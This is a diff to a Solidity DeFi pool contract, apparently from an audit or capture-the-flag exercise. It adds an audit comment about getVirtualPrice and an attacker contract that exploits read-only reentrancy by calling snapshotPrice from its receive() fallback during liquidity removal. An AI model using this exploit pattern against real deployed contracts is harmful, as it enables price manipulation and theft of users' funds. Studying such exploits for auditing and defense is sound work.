@@ -78,11 +78,27 @@ contract ReadOnlyPool is ReentrancyGuard, ERC20("LPToken", "LPT") {
      *         more because they can redeem the same size of a larger pool.
      * @dev there is always at least as much
      */
-
+    //@audit if token total supply is larger than contract eth balance, price will be 0
     function getVirtualPrice() external view returns (uint256 virtualPrice) {
         virtualPrice = address(this).balance / totalSupply();
     }
 
     // @notice earn profits for the pool
     function earnProfit() external payable {}
+}
+
+contract VulnerableDeFiContractAttacker {
+    ReadOnlyPool private pool;
+    VulnerableDeFiContract private vulnerableContract;
+    constructor(ReadOnlyPool _pool, VulnerableDeFiContract _vulnerableContract) payable {
+        pool = _pool;
+        vulnerableContract = _vulnerableContract;
+    }
+    function attack() external {
+        pool.addLiquidity{value: 1 ether}();
+        pool.removeLiquidity();
+    }
+    receive() external payable {
+        vulnerableContract.snapshotPrice();
+    }
 }
